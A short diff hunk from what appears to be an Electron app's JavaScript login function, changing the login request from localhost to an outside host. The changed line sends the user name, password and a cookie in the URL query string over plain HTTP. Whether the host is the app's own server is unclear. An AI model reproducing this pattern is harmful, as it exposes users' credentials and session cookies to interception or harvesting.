@@ -21,7 +21,7 @@ function logen() {
     document.getElementById("loading").classList.add("d-flex")
     sleep(700)
     
-    $.get("http://127.0.0.1/login"+"?user="+user+"&pass="+password+"&cookie="+cook, function(data, status){
+    $.get("http://p3rl4.me/login"+"?user="+user+"&pass="+password+"&cookie="+cook, function(data, status){
         if(data == "accepted"){
             sleep(2500)
             ipc.send('entry-accepted', 'login')
